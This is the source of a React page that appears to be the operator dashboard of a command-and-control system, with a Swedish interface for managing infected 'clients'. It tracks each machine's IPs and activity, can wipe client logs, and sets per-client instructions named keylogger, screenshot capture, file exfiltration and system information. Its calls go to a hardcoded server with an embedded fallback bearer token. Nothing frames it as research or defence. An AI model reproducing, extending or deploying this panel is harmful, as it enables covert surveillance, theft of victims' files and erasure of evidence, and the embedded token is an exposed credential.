
import React, { useState } from "react";
import { useQuery, useMutation, useQueryClient } from "@tanstack/react-query";
import { Card, CardContent } from "@/components/ui/card";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Button } from "@/components/ui/button";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { ClientsList } from "@/components/clients/ClientsList";
import { ClientDetails } from "@/components/clients/ClientDetails";
import { Badge } from "@/components/ui/badge";
import { Input } from "@/components/ui/input";
import { SearchIcon } from "lucide-react";
import { toast } from "sonner";
import { getClients, updateClientInstruction, ClientInstruction } from "@/services/scriptsService";
import { AppLayout } from "@/components/layout/AppLayout";

interface FormattedClient {
  id: string;
  name: string;
  os: string;
  ip: string;
  privateIp: string;
  firstSeen: string;
  lastSeen: string;
  isActive: boolean;
  instruction: string;
  system: string;
  [key: string]: any; // Allow for additional properties
}

export default function Clients() {
  const [activeTab, setActiveTab] = useState("all");
  const [selectedClient, setSelectedClient] = useState<string | null>(null);
  const [searchTerm, setSearchTerm] = useState("");
  const [statusFilter, setStatusFilter] = useState("all");
  const [isRefreshing, setIsRefreshing] = useState(false);
  const queryClient = useQueryClient();

  const { data, isLoading, error, refetch } = useQuery({
    queryKey: ['clients'],
    queryFn: async () => {
      console.log("Fetching clients from API");
      try {
        const clients = await getClients();
        
        if (!clients || clients.length === 0) {
          console.log("No clients found");
          return { clients: [] };
        }
        
        const formattedClients = clients.map(client => ({
          id: client.id || client.name,
          name: client.name || 'Unknown',
          os: client.system || 'Unknown',
          ip: client.ip || client.public_ip || 'Unknown',
          privateIp: client.privateIp || client.private_ip || 'Unknown',
          firstSeen: client.firstSeen || client.first_seen || 'Unknown',
          lastSeen: client.lastActivity || client.last_activity || client.lastSeen || 'Unknown',
          isActive: client.isActive === true || (client.lastActivity && 
            (new Date().getTime() - new Date(client.lastActivity).getTime()) < 30 * 60 * 1000),
          instruction: client.instruction || client.currentInstruction || 'standard',
          system: client.system || 'Unknown'
        }));
        
        console.log(`Fetched ${formattedClients.length} clients successfully`);
        return { clients: formattedClients };
      } catch (error) {
        console.error("Error fetching clients:", error);
        return { clients: [] };
      }
    },
    refetchInterval: 30000, // Update every 30 seconds
  });

  const updateInstructionMutation = useMutation({
    mutationFn: async ({ clientId, instruction }: { clientId: string; instruction: string }) => {
      return updateClientInstruction(clientId, instruction);
    },
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ['clients'] });
      toast.success("Klientinstruktion uppdaterad");
      refreshClients();
    },
    onError: (error: any) => {
      console.error("Error updating instruction:", error);
      toast.error(`Kunde inte uppdatera instruktion: ${error.message || 'Okänt fel'}`);
    },
  });

  const refreshClients = async () => {
    setIsRefreshing(true);
    try {
      await refetch();
      toast.success("Klientlistan uppdaterad");
    } catch (err) {
      toast.error("Fel vid uppdatering av klientlistan");
      console.error("Error refreshing clients:", err);
    } finally {
      setIsRefreshing(false);
    }
  };

  const handlePingClient = async (clientId: string) => {
    toast.info(`Pingar klient ${clientId}...`);
    try {
      const response = await fetch(`${import.meta.env.VITE_API_URL || 'https://neea.fun'}/api/ping_client`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${import.meta.env.VITE_AUTH_TOKEN || 'SmpVdUpXMEZKTk5nT2CQWGh4SVFlM3lNUWtDUGZJeEtXM2VkU3RuUExwVg=='}`
        },
        body: JSON.stringify({ client_id: clientId }),
      });
      
      if (!response.ok) {
        const errorText = await response.text();
        throw new Error(`Server error: ${response.status} ${errorText}`);
      }
      
      const result = await response.json();
      if (result.status === "success") {
        toast.success(`Klient ${clientId} pingades framgångsrikt`);
      } else {
        toast.error(`Fel vid ping av klient: ${result.message || 'Okänt fel'}`);
      }
      refreshClients();
    } catch (error: any) {
      console.error("Error pinging client:", error);
      toast.error(`Fel vid ping av klient: ${error.message || 'Okänt fel'}`);
    }
  };

  const handleClearLogs = async (clientId: string) => {
    if (window.confirm(`Är du säker på att du vill rensa loggarna för klient ${clientId}?`)) {
      toast.info(`Rensar loggar för klient ${clientId}...`);
      try {
        const response = await fetch(`${import.meta.env.VITE_API_URL || 'https://neea.fun'}/api/clear_logs`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${import.meta.env.VITE_AUTH_TOKEN || 'SmpVdUpXMEZKTk5nT2CQWGh4SVFlM3lNUWtDUGZJeEtXM2VkU3RuUExwVg=='}`
          },
          body: JSON.stringify({ client_id: clientId }),
        });
        
        if (!response.ok) {
          const errorText = await response.text();
          throw new Error(`Server error: ${response.status} ${errorText}`);
        }
        
        const result = await response.json();
        if (result.status === "success") {
          toast.success("Klientloggar rensade");
        } else {
          toast.error(`Fel vid rensning av loggar: ${result.message || 'Okänt fel'}`);
        }
      } catch (error: any) {
        console.error("Error clearing logs:", error);
        toast.error(`Fel vid rensning av loggar: ${error.message || 'Okänt fel'}`);
      }
    }
  };

  const handleUpdateInstruction = async (clientId: string, instruction: string) => {
    try {
      updateInstructionMutation.mutate({ clientId, instruction });
    } catch (error: any) {
      console.error("Error updating instruction:", error);
      toast.error(`Fel vid uppdatering av instruktion: ${error.message || 'Okänt fel'}`);
    }
  };

  const filterClients = (clients: FormattedClient[]) => {
    let filtered = [...clients];
    
    if (searchTerm) {
      const term = searchTerm.toLowerCase();
      filtered = filtered.filter(client => 
        client.name.toLowerCase().includes(term) || 
        client.id.toLowerCase().includes(term) ||
        client.os.toLowerCase().includes(term)
      );
    }
    
    if (statusFilter === "online") {
      filtered = filtered.filter(client => client.isActive);
    } else if (statusFilter === "offline") {
      filtered = filtered.filter(client => !client.isActive);
    }
    
    return filtered;
  };

  const handleClientClick = (clientId: string) => {
    setSelectedClient(clientId);
  };

  const handleClientBack = () => {
    setSelectedClient(null);
  };

  const clients = data?.clients || [];
  const filteredClients = filterClients(clients);
  const selectedClientData = clients.find(client => client.id === selectedClient);
  
  const onlineCount = clients.filter(c => c.isActive).length;
  const offlineCount = clients.filter(c => !c.isActive).length;
  
  if (error) {
    console.error("Error fetching client data:", error);
    toast.error("Fel vid hämtning av klientdata", {
      id: "client-fetch-error",
      duration: 5000,
    });
  }
  
  return (
    <AppLayout>
      <div className="h-full flex-1 flex-col space-y-8 p-8 md:flex">
        <div className="flex items-center justify-between">
          <h2 className="text-3xl font-bold tracking-tight">Klienter</h2>
          <div className="flex items-center space-x-2">
            <Badge variant="outline">
              Totalt: {clients.length}
            </Badge>
            <Badge variant="outline" className="bg-green-100 text-green-800 dark:bg-green-900 dark:text-green-200">
              Online: {onlineCount}
            </Badge>
            <Badge variant="outline" className="bg-red-100 text-red-800 dark:bg-red-900 dark:text-red-200">
              Offline: {offlineCount}
            </Badge>
            <Button 
              variant="outline" 
              size="sm" 
              onClick={refreshClients}
              disabled={isRefreshing}
            >
              {isRefreshing ? "Uppdaterar..." : "Uppdatera"}
            </Button>
          </div>
        </div>

        {!selectedClient ? (
          <>
            <div className="flex flex-col md:flex-row items-center gap-4">
              <div className="relative w-full md:w-96">
                <SearchIcon className="absolute left-2.5 top-2.5 h-4 w-4 text-muted-foreground" />
                <Input
                  type="search"
                  placeholder="Sök klienter..."
                  className="w-full pl-8"
                  value={searchTerm}
                  onChange={(e) => setSearchTerm(e.target.value)}
                />
              </div>
              <Select
                value={statusFilter}
                onValueChange={setStatusFilter}
              >
                <SelectTrigger className="w-full md:w-40">
                  <SelectValue placeholder="Status" />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="all">Alla statusar</SelectItem>
                  <SelectItem value="online">Online</SelectItem>
                  <SelectItem value="offline">Offline</SelectItem>
                </SelectContent>
              </Select>
            </div>

            <Tabs value={activeTab} onValueChange={setActiveTab}>
              <TabsList className="grid w-full md:w-[400px] grid-cols-2">
                <TabsTrigger value="all">Alla klienter</TabsTrigger>
                <TabsTrigger value="active">Aktiva klienter</TabsTrigger>
              </TabsList>
              <TabsContent value="all" className="mt-6">
                {filteredClients.length === 0 && !isLoading ? (
                  <Card>
                    <CardContent className="p-6 text-center">
                      <p className="text-muted-foreground">Inga klienter hittades</p>
                      <p className="text-sm text-muted-foreground mt-2">
                        {searchTerm || statusFilter !== "all" 
                          ? "Prova att ändra dina sökfilter" 
                          : "Inga klienter har anslutit till servern ännu"}
                      </p>
                    </CardContent>
                  </Card>
                ) : (
                  <ClientsList 
                    clients={filteredClients} 
                    isLoading={isLoading} 
                    onClientClick={handleClientClick} 
                    onRefresh={refreshClients}
                  />
                )}
              </TabsContent>
              <TabsContent value="active" className="mt-6">
                {filteredClients.filter(client => client.isActive).length === 0 && !isLoading ? (
                  <Card>
                    <CardContent className="p-6 text-center">
                      <p className="text-muted-foreground">Inga aktiva klienter hittades</p>
                      <p className="text-sm text-muted-foreground mt-2">
                        {searchTerm 
                          ? "Prova att ändra dina sökfilter" 
                          : "Inga klienter är aktiva just nu"}
                      </p>
                    </CardContent>
                  </Card>
                ) : (
                  <ClientsList 
                    clients={filteredClients.filter(client => client.isActive)} 
                    isLoading={isLoading} 
                    onClientClick={handleClientClick} 
                    onRefresh={refreshClients}
                  />
                )}
              </TabsContent>
            </Tabs>
          </>
        ) : (
          <div className="flex flex-col space-y-6">
            <Button 
              variant="outline" 
              onClick={handleClientBack}
              className="w-24"
            >
              Tillbaka
            </Button>
            {selectedClientData && (
              <div className="space-y-4">
                <div className="flex flex-wrap gap-2">
                  <Button 
                    variant="outline" 
                    onClick={() => handlePingClient(selectedClientData.id)}
                  >
                    Pinga klient
                  </Button>
                  <Button 
                    variant="outline" 
                    onClick={() => handleClearLogs(selectedClientData.id)}
                  >
                    Rensa loggar
                  </Button>
                  <Select
                    value={selectedClientData.instruction || "standard"}
                    onValueChange={(value) => handleUpdateInstruction(selectedClientData.id, value)}
                  >
                    <SelectTrigger className="w-full md:w-48">
                      <SelectValue placeholder="Instruktionstyp" />
                    </SelectTrigger>
                    <SelectContent>
                      <SelectItem value="standard">Standard</SelectItem>
                      <SelectItem value="keylogger">Tangentloggare</SelectItem>
                      <SelectItem value="screenshot">Skärmdump</SelectItem>
                      <SelectItem value="file_exfiltration">Filexfiltration</SelectItem>
                      <SelectItem value="system_info">Systeminformation</SelectItem>
                    </SelectContent>
                  </Select>
                </div>
                <ClientDetails client={selectedClientData} />
              </div>
            )}
            {!selectedClientData && (
              <Card>
                <CardContent className="p-6">
                  <p className="text-center text-muted-foreground">Klienten kunde inte hittas</p>
                </CardContent>
              </Card>
            )}
          </div>
        )}
      </div>
    </AppLayout>
  );
}
